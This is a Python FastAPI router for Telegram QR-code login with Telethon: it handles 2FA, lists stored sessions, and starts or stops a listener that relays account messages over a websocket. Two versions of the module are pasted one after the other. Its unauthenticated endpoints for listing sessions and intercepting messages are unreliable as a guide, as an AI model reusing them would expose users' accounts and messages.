from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from telethon.errors import SessionPasswordNeededError
import logging

from backend.storage.login_state import LoginState
from backend.telegram.qr_login import create_qr_login
from backend.telegram.listener import setup_message_listener
from backend.storage.ws_manager import ws_manager

log = logging.getLogger("auth")

router = APIRouter()
state = LoginState()


# =======================
# MODELS
# =======================

class StartResponse(BaseModel):
    login_id: str
    qr_url: str
    expires_at: int


class PasswordRequest(BaseModel):
    login_id: str
    password: str


# =======================
# START LOGIN
# =======================

@router.post("/start", response_model=StartResponse)
async def start_login():
    log.info("Starting QR login")

    client, qr = await create_qr_login()
    login_id = qr.token.hex()

    state.create(login_id, client, qr)

    log.info(f"Login created: {login_id}")
    log.debug(f"QR URL: {qr.url}")
    log.debug(f"QR expires: {qr.expires}")

    return StartResponse(
        login_id=login_id,
        qr_url=qr.url,
        expires_at=int(qr.expires.timestamp()),
    )


# =======================
# CHECK STATUS
# =======================

@router.get("/status/{login_id}")
async def check_status(login_id: str):
    log.debug(f"Check status: {login_id}")

    item = state.get(login_id)
    if not item:
        raise HTTPException(404)

    client = item["client"]

    try:
        me = await client.get_me()
        if me:
            log.info(f"AUTHORIZED: {me.id} @{me.username}")

            if not item.get("listener_started"):
                log.info("Starting Telegram message listener")
                setup_message_listener(client, ws_manager)
                item["listener_started"] = True

            return {"status": "authorized"}

    except SessionPasswordNeededError:
        return {"status": "need_password"}

    except Exception as e:
        log.debug(f"Waiting: {e}")
        return {"status": "waiting"}



# =======================
# SEND 2FA PASSWORD
# =======================

@router.post("/password")
async def send_password(data: PasswordRequest):
    log.info(f"Sending 2FA password for login {data.login_id}")

    item = state.get(data.login_id)
    if not item:
        log.warning("Login not found for password")
        raise HTTPException(status_code=404)

    client = item["client"]

    try:
        await client.sign_in(password=data.password)
        log.info("2FA password accepted")
        return {"status": "ok"}

    except Exception as e:
        log.error(f"2FA failed: {e}")
        raise HTTPException(status_code=400, detail="Invalid password")
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from telethon.errors import SessionPasswordNeededError
import logging

from backend.storage.login_state import LoginState
from backend.telegram.qr_login import create_qr_login
from backend.telegram.listener import setup_message_listener
from backend.storage.ws_manager import ws_manager

log = logging.getLogger("auth")

router = APIRouter()
state = LoginState()


# =======================
# MODELS
# =======================

class StartResponse(BaseModel):
    login_id: str
    qr_url: str
    expires_at: int


class PasswordRequest(BaseModel):
    login_id: str
    password: str


# =======================
# START LOGIN
# =======================

@router.post("/start", response_model=StartResponse)
async def start_login():
    log.info("Starting QR login")

    client, qr = await create_qr_login()
    login_id = qr.token.hex()

    state.create(login_id, client, qr)

    log.info(f"Login created: {login_id}")
    log.debug(f"QR URL: {qr.url}")
    log.debug(f"QR expires: {qr.expires}")

    return StartResponse(
        login_id=login_id,
        qr_url=qr.url,
        expires_at=int(qr.expires.timestamp()),
    )


# =======================
# CHECK STATUS
# =======================

@router.get("/status/{login_id}")
async def check_status(login_id: str):
    log.debug(f"Check status: {login_id}")

    item = await state.get(login_id)
    if not item:
        raise HTTPException(404)

    client = item.get("client")

    try:
        me = await client.get_me()
        if me:
            log.info(f"AUTHORIZED: {me.id} @{me.username}")

            # We don't automatically start message listener here. Admin must explicitly
            # request to start listening for a specific account (see /auth/listen).
            return {"status": "authorized"}
        # If get_me returned falsy (not authorized yet), report waiting
        return {"status": "waiting"}

    except SessionPasswordNeededError:
        return {"status": "need_password"}

    except Exception as e:
        log.debug(f"Waiting: {e}")
        return {"status": "waiting"}



# =======================
# SEND 2FA PASSWORD
# =======================

@router.post("/password")
async def send_password(data: PasswordRequest):
    log.info(f"Sending 2FA password for login {data.login_id}")

    item = await state.get(data.login_id)
    if not item:
        log.warning("Login not found for password")
        raise HTTPException(status_code=404)

    client = item.get("client")

    try:
        await client.sign_in(password=data.password)
        log.info("2FA password accepted")
        return {"status": "ok"}

    except Exception as e:
        log.error(f"2FA failed: {e}")
        raise HTTPException(status_code=400, detail="Invalid password")


# =======================
# LIST LOGINS
# =======================


@router.get("/logins")
async def list_logins():
    """Return stored login entries (shallow).

    For each stored login we attempt to include a friendly `username` field
    if the Telegram client is connected. We avoid blocking too long on
    unreachable sessions by catching exceptions.
    """
    out = []
    for login_id in list(state.data.keys()):
        base = dict(state.data.get(login_id, {}))
        username = None
        try:
            # Try to obtain a connected client and read account info
            item = await state.get(login_id)
            if item:
                client = item.get("client")
                if client:
                    try:
                        me = await client.get_me()
                        if me:
                            username = getattr(me, "username", None) or getattr(me, "first_name", None)
                    except Exception:
                        # ignore errors from get_me (network / auth issues)
                        username = None
        except Exception:
            # Any error while resolving a login shouldn't fail the whole endpoint
            username = None

        entry = {"login_id": login_id, **base}
        entry["username"] = username
        out.append(entry)

    return out


# =======================
# START LISTENING FOR A LOGIN
# =======================


class ListenRequest(BaseModel):
    login_id: str


@router.post("/listen")
async def start_listen(data: ListenRequest):
    log.info(f"Start listening request for {data.login_id}")

    item = await state.get(data.login_id)
    if not item:
        log.warning("Login not found for listen")
        raise HTTPException(status_code=404)

    client = item.get("client")

    if item.get("listener_started"):
        return {"status": "already_listening"}

    # Attach listener that annotates messages with login_id and keep handler reference
    try:
        handler = setup_message_listener(client, ws_manager, data.login_id)
    except Exception as e:
        log.error(f"Failed to attach listener: {e}")
        raise HTTPException(status_code=500, detail="Failed to start listener")

    # Persist listener state
    state.set_listener_started(data.login_id, True)
    # also keep handler runtime reference
    item["listener_handler"] = handler

    return {"status": "ok"}


class UnlistenRequest(BaseModel):
    login_id: str


@router.post("/unlisten")
async def stop_listen(data: UnlistenRequest):
    log.info(f"Stop listening request for {data.login_id}")

    item = await state.get(data.login_id)
    if not item:
        log.warning("Login not found for unlisten")
        raise HTTPException(status_code=404)

    client = item.get("client")
    handler = item.get("listener_handler")
    if not handler:
        return {"status": "not_listening"}

    try:
        client.remove_event_handler(handler)
    except Exception as e:
        log.error(f"Failed to remove handler: {e}")
        raise HTTPException(status_code=500, detail="Failed to stop listener")

    item.pop("listener_handler", None)
    state.set_listener_started(data.login_id, False)

    return {"status": "ok"}
